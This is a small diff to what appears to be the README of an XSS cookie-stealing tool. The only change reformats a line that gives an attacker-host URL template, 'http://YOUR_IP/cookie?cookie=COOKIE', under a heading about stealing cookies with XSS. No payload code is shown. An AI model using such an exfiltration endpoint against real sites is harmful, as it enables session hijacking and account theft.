@@ -31,7 +31,9 @@ $ pip install flask
  
 # stealing cookie using xss :
 
- <h2>enter the cookie in this url ````http://YOUR_IP/cookie?cookie=COOKIE```` </h2>
+ <h2>enter the cookie in this url </h2>
+ 
+ ````http://YOUR_IP/cookie?cookie=COOKIE```` 
 
 # Payload :
   
